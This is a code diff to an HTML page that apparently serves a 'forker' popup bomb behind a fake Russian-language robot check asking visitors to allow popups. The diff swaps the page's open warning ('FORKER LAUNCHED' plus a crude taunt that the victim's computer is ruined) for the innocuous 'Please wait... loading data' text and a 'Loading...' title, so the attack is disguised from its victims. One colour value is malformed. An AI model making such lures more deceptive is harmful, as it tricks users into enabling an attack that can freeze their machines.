@@ -16,7 +16,7 @@
     }
     #bot-check, #warning { display: none; }
     #bot-check p { font-size: 1.5em; margin: .5em 0; }
-    #warning h1 { color: #e74c3c; font-size: 3em; margin: .2em 0; }
+    #warning h1 { color: ###f90000; font-size: 3em; margin: .2em 0; }
     #warning p { font-size: 1.2em; margin: .5em 0; }
     canvas { position: absolute; top: 0; left: 0; }
   </style>
@@ -26,15 +26,15 @@
     <p>Разрешите всплывающие окна, чтобы пройти проверку на робота</p>
   </div>
   <div id="warning">
-    <h1>ФОРКЕР ЗАПУЩЕН</h1>
-    <p>ЗРЯ ТЫ ЗАПУСТИЛ ЕГО, ТВОЕМУ КОМПУ ПИЗДА :)</p>
+    <h1>Please wait...</h1>
+    <p>loading data right now...</p>
   </div>
 
   <script>
   (function(){
     const params     = new URLSearchParams(window.location.search);
     const isOriginal = params.has('i');
-    document.title   = isOriginal ? 'robotCheck' : 'FORKER';
+    document.title   = isOriginal ? 'robotCheck' : 'Loading...';
 
     const botCheck = document.getElementById('bot-check'),
           warning  = document.getElementById('warning');
